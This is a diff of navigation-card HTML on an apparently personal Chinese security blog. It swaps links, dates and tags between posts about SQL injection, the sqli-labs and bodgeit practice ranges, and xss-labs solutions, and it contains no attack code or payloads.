+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/1d0a.html">
+                <a href="/posts/b737.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="bodgeit靶场">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="sql注入漏洞">
                         
-                        <span class="card-title">bodgeit靶场</span>
+                        <span class="card-title">sql注入漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这两天在学长的引导下，我把bodgeit靶场练习了一下。以下是我练习的一些关卡。
+                            打完65关的sql靶场，浅浅地整理了一下关于sql注入的知识点。主要是mysql数据库的。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category">
-                                    靶场
+                            <a href="/categories/web%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    web漏洞
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/bodgeit/">
-                        <span class="chip bg-color">bodgeit</span>
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">sql注入</span>
                     </a>
                     
-                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
-                        <span class="chip bg-color">靶场</span>
+                    <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">web漏洞</span>
                     </a>
                     
                 </div>
@@ -750,24 +832,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/84ce.html">
+                <a href="/posts/b894.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="xss-labs题解">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="sqli靶场(54~65关)">
                         
-                        <span class="card-title">xss-labs题解</span>
+                        <span class="card-title">sqli靶场(54~65关)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前些时间把xss-labs的靶场练习了一下，其实如果想练习靶场的话，可以是从xss先开始的，sqli练习的我还停留在第四关。xss总共20关，还是好理解一点的，下面是我的一些理解。
+                            最后一个部分啦~
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-12
                             </span>
                         <span class="publish-author">
                             
@@ -788,8 +870,8 @@
                         <span class="chip bg-color">靶场</span>
                     </a>
                     
-                    <a href="/tags/xss/">
-                        <span class="chip bg-color">xss</span>
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">sql注入</span>
                     </a>
                     
                 </div>
